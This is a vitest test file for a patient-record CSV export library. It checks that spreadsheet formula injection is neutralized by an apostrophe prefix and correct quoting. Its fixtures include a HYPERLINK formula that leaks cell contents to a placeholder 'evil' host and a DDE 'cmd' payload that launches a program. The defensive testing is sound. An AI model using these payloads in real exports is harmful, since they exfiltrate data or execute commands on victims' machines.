/**
 * A2b-S-vis: escape de fórmulas del export CSV de pacientes (lib/csv.ts).
 * Afirma el texto exacto de la celda que termina en el archivo.
 */
import { describe, it, expect } from "vitest";
import { csvCell, csvRow, neutralizeFormula } from "@/lib/csv";

describe("neutralizeFormula", () => {
  it.each([
    ["=HYPERLINK(\"http://x\",\"a\")", "'=HYPERLINK(\"http://x\",\"a\")"],
    ["+54 11 5555-5555", "'+54 11 5555-5555"],
    ["-2+3", "'-2+3"],
    ["@SUM(A1)", "'@SUM(A1)"],
    ["\t=1+1", "'\t=1+1"],
    ["\r=1+1", "'\r=1+1"],
  ])("prefija %j", (input, expected) => {
    expect(neutralizeFormula(input)).toBe(expected);
  });

  it.each(["Pérez", "juan@mail.com", "30123456", "", "a=b", "1-2"])("no toca %j", (v) => {
    expect(neutralizeFormula(v)).toBe(v);
  });
});

describe("csvCell", () => {
  it("null/undefined → vacío", () => {
    expect(csvCell(null)).toBe("");
    expect(csvCell(undefined)).toBe("");
  });

  it("cita comas, comillas y saltos de línea", () => {
    expect(csvCell("Pérez, Juan")).toBe('"Pérez, Juan"');
    expect(csvCell('Juan "el kine"')).toBe('"Juan ""el kine"""');
    expect(csvCell("a\nb")).toBe('"a\nb"');
  });

  it("neutraliza ANTES de citar (el apóstrofo queda dentro de las comillas)", () => {
    expect(csvCell('=HYPERLINK("http://evil/?"&A1,"ver")')).toBe(
      '"\'=HYPERLINK(""http://evil/?""&A1,""ver"")"'
    );
    expect(csvCell("\r=1+1")).toBe('"\'\r=1+1"');
  });
});

describe("csvRow", () => {
  it("une las celdas escapadas", () => {
    expect(csvRow(["id1", "=cmd|' /C calc'!A0", null, "ok"])).toBe("id1,'=cmd|' /C calc'!A0,,ok");
  });
});
